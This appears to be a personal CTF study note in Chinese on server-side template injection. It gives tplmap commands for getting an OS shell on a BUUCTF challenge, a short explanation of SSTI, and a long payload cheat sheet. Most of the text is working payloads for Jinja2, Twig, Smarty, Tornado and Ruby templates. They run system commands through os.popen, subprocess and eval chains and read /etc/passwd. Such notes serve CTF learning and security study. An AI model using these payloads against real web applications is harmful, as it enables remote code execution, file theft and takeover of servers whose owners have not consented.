# tplmap使用

tplmap需要python2的运行环境

- (kali中更改python版本使用命令`sudo update-alternatives --config python`,然后手动选择版本)

语法:(进入到/home/cjy/CTF-tools/tplmap/后)

`./tplmap -u http://036c3e84-70cc-4a38-a626-16b8d5d4271b.node5.buuoj.cn:81/qaq?name=1`

#可以查询模板,并且还会提示我们使用什么注入

对于buuctf fake google这题,就可以使用命令:

`./tplmap.py -u http://036c3e84-70cc-4a38-a626-16b8d5d4271b.node5.buuoj.cn:81/qaq?name=1 --engine=Jinja2 --os-shell`拿到shell命令界面,别忘了--engine指定模板



# 一.什么是服务器端模板注入？

- 简单来说，就是网站内容的动态部分，如果有一个网站的内容几乎相同，但只有某些部分发生改变，那么他们很有可能使用了模板

服务器端模板注入是指攻击者能够使用本机模板语法将恶意有效负载注入模板中，然后在服务器端执行该模板。

模板引擎旨在通过将固定模板与易失性数据结合来生成网页。当用户输入直接连接到模板而不是作为数据传递时，可能会发生服务器端模板注入攻击。这使攻击者可以注入任意模板指令以操纵模板引擎，从而经常使攻击者能够完全控制服务器。顾名思义，服务器端模板注入有效负载是在服务器端交付和评估的，这可能使它们比典型的客户端模板注入更加危险。

# 二.服务器端模板注入有什么影响？

服务器端模板注入漏洞可能使网站遭受各种攻击，具体取决于所讨论的模板引擎以及应用程序使用它的方式。在某些罕见情况下，这些漏洞不会带来真正的安全风险。但是，在大多数情况下， 服务器端模板注入的影响可能是灾难性的。

在规模最大的一端，攻击者可以潜在地实现远程代码执行，从而完全控制后端服务器，并使用它对内部基础结构进行其他攻击。

即使在无法完全执行远程代码的情况下，攻击者通常仍可以使用服务器端模板注入作为其他众多攻击的基础，从而有可能获得对服务器上敏感数据和任意文件的读取权限。



# 判断模板注入类型的办法

https://img-blog.csdnimg.cn/img_convert/61b42a16c2b405e6ab1ada36470713f1.png

有的时候相同的payload可能会有两种响应，比如{{7*'7'}}在Twig中会的到49，而在Jinja2中会得到7777777。



# 各个模板注入的payload

## Flask/jinja2

`{{7*7}}`看看能不能成功执行,如果输出49即为flask框架

- 可以尝试`{{system('ls')}}`执行命令

- 查看环境变量可以用`{{config}}`

	如果config被过滤也可以使用:()其中这两个函数包含了``current_app`

	```
	url_for和get_flashed_messages
	```

	具体用法:

	```
	{{url_for.__globals__}}
	{{get_flashed_messages.__globals__}}
	```

	再查询当前app下的`config`

	```
	{{url_for.__globals__['current_app'].config}}
	{{get_flashed_messages.__globals__['current_app'].config}}
	```

	

## Twig

`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}`

`cat /flag`可以换成其他系统命令

## Smarty

在``{}``里可以直接执行php命令

## 各种payload示例：

- 通过config，调用os
	`{{config.__class__.__init__.__globals__[‘os’].popen(‘ls’).read()}}`

	无过滤的情况下也可以直接`{{config}}`看看能不能撞上flag（？）

- 通过url_for，调用os
	`{{url_for.__globals__.os.popen('ls').read()}}`

- 在已加载os模块的子类里直接调用os模块
	`{{“”.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[‘os’].popen(“ls”).read()}}`

	`{{“”.__class__.__base__.__subclasses__()[117].__init__.__globals__[‘builtins’][‘eval’]("__import__.(‘os’).popen(‘ls’).read()")}} `

- importlib类执行命令
	importlib类执行命令相当于自己导入，可以加载第三方库，使用load_module加载os

	`{{[].__class__.__base__.__subclasses__()[69].["load_module"]("os")[“popen”](‘ls’).read()}}`

- linecache函数执行命令
	linecache函数可用于读取任意一个文件的某一行，而这个函数中也引入了os 模块，所以我们也可以利用这个 linecache 函数去执行命令。

	`{{[].__class__.__base__.__subclasses__()[19].__init__.__globals__.linecache.os.popen("ls").read()}}`

- subprocess.Popen类执行命令
	从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。

	`{{().__class__.__base__.__subclasses__()[13](“ls”,shell=True,stdout=-1).communicate()[0].strip()}}`

## 测试用例

- 简单的数学表达式，`{{ 7+7 }} => 14`

- 字符串表达式 `{{ "ajin" }} => ajin`

- - Ruby

		`<%= 7 * 7 %><%= File.open('/etc/passwd').read %>`

- - Java

		`${7*7}`

- - Twig

		`{{7*7}}`

- - Smarty

		`{php}echo `id`;{/php}`

- - AngularJS

		`$eval('1+1')`

- - Tornado

		引用模块 `{% import module %}`=> `{% import os %}{{ os.popen("whoami").read() }}`

- - Flask/Jinja2

  	`{{ config }}`
  	
  	`{{ config.items() }}`
  	
  	`{{get_flashed_messages.__globals__['current_app'].config}}`
  	
  	`{{''.__class__.__mro__[-1].__subclasses__()}}`
  	
  	`{{url_for.__globals__['__builtins__'].__import__('os').system('ls') }}`
  	
  	`{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`

- - Django

		`{{ request }}``{% debug %}``{% load module %}``{% include "x.html" %}``{% extends "x.html" %}`